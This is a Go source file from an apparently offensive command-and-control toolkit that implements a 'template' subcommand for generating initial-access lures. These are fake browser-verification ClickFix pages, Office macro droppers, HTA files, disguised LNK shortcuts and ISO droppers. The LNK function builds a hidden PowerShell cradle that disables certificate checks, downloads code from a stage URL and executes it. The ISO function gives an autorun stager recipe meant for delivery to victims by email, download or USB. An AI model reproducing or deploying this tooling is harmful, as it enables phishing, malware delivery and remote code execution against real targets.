package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"
)

// ── template subcommand ───────────────────────────────────────────────────────

var templateCmd = &cobra.Command{
	Use:   "template",
	Short: "Generate delivery templates for initial access (no compilation required)",
	Long: `Generate social-engineering / delivery templates that point to an existing
stage URL or stager binary. Requires --type and --url (or --stager-file).

Types
─────
clickfix   Fake browser verification page with Win+R lure (most effective)
macro      Office VBA macro dropper (Excel / Word)
hta        HTML Application — works via <a href=...> or direct exec
lnk        Windows Shortcut (.lnk) PowerShell cradle
iso        ISO contents listing (autorun.inf + payload copy command)
`,
	Example: `  taburtuai-generate template --type clickfix \
    --stager-file bin/stager.exe \
    --lure "Human Verification Required" \
    --output lure.html

  taburtuai-generate template --type macro \
    --url https://c2.example.com/stage/TOKEN \
    --output macro.bas

  taburtuai-generate template --type hta \
    --url https://c2.example.com/stage/TOKEN \
    --output phish.hta`,
	RunE: runTemplate,
}

func init() {
	templateCmd.Flags().String("type", "", "Template type: clickfix|macro|hta|lnk|iso (required)")
	templateCmd.Flags().String("url", "", "Stage endpoint URL (e.g. https://c2.example.com/stage/payload)")
	templateCmd.Flags().String("token", "", "Stage token — sent as X-Stage-Token header (required with --url)")
	templateCmd.Flags().String("stager-file", "", "Local stager EXE file (embedded in output)")
	templateCmd.Flags().String("lure", "", "Lure text shown to victim")
	templateCmd.Flags().String("output", "", "Output file path")
	_ = templateCmd.MarkFlagRequired("type")
}

func runTemplate(cmd *cobra.Command, _ []string) error {
	ttype, _ := cmd.Flags().GetString("type")
	url, _ := cmd.Flags().GetString("url")
	token, _ := cmd.Flags().GetString("token")
	stagerFile, _ := cmd.Flags().GetString("stager-file")
	lure, _ := cmd.Flags().GetString("lure")
	output, _ := cmd.Flags().GetString("output")

	var stagerBytes []byte
	if stagerFile != "" {
		b, err := os.ReadFile(stagerFile)
		if err != nil {
			return fmt.Errorf("read stager file: %w", err)
		}
		stagerBytes = b
	}

	var data []byte
	var ext string

	switch strings.ToLower(ttype) {
	case "clickfix":
		if len(stagerBytes) == 0 {
			return fmt.Errorf("--stager-file required for clickfix template")
		}
		data, ext = []byte(templateClickFix(stagerBytes, lure)), ".html"

	case "macro":
		if url == "" {
			return fmt.Errorf("--url required for macro template")
		}
		data, ext = []byte(templateVBA(url, token)), ".bas"

	case "hta":
		if url == "" && len(stagerBytes) == 0 {
			return fmt.Errorf("--url or --stager-file required for hta template")
		}
		data, ext = []byte(templateHTA(url, token, stagerBytes)), ".hta"

	case "lnk":
		if url == "" {
			return fmt.Errorf("--url required for lnk template")
		}
		data, ext = []byte(templateLNK(url, lure)), ".txt"

	case "iso":
		if url == "" && len(stagerBytes) == 0 {
			return fmt.Errorf("--url or --stager-file required for iso template")
		}
		data, ext = []byte(templateISO(url, lure)), ".txt"

	default:
		return fmt.Errorf("unknown template type %q (clickfix|macro|hta|lnk|iso)", ttype)
	}

	return writeOutput(output, ext, data)
}

// templateLNK outputs a PowerShell command to create a malicious LNK file
// pointing to a PS1 cradle. The user creates the LNK via the provided PS1.
func templateLNK(stageURL, lure string) string {
	if lure == "" {
		lure = "Document"
	}
	ps1Cmd := fmt.Sprintf(
		`powershell -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};`+
			`iex([System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('%s')))"`,
		stageURL,
	)
	return fmt.Sprintf(`# Run this PS1 on your attack host to create the LNK file
# Then deliver the .lnk to the target (ISO, USB, email attachment)

$lnkPath   = "$env:DESKTOP\%s.lnk"
$targetCmd = "C:\Windows\System32\cmd.exe"
$args      = '/c "%s"'
$iconPath  = "C:\Windows\System32\shell32.dll,3"

$sh  = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut($lnkPath)
$lnk.TargetPath      = $targetCmd
$lnk.Arguments       = $args
$lnk.IconLocation    = $iconPath
$lnk.WindowStyle     = 7  # Minimized
$lnk.Description     = "%s"
$lnk.Save()
Write-Host "[+] LNK created: $lnkPath"
`, lure, ps1Cmd, lure)
}

// templateISO outputs a recipe for building a malicious ISO.
// Uses mkisofs/hdiutil (Linux/macOS) or oscdimg (Windows).
func templateISO(stageURL, lure string) string {
	if lure == "" {
		lure = "Document"
	}
	return fmt.Sprintf(`# ISO dropper recipe
# Place these files in a staging directory, then create the ISO.
#
# Directory structure:
#   iso/
#   ├── autorun.inf        ← auto-execute on Windows XP/2003 (legacy)
#   ├── %s.lnk    ← LNK file pointing to stager
#   └── stager.exe         ← stager binary (from 'generate stager --format exe')
#
# autorun.inf content:
#   [AutoRun]
#   open=stager.exe
#   icon=stager.exe,0
#
# Stage URL (stager downloads payload from here):
#   %s
#
# Create ISO on Linux:
#   mkisofs -o lure.iso -J -R -l iso/
#
# Create ISO on Windows (requires oscdimg from Windows ADK):
#   oscdimg -n -m iso/ lure.iso
#
# Deliver via: email attachment, web download, or USB
# The LNK file works even without autorun (user double-clicks)
`, lure, stageURL)
}
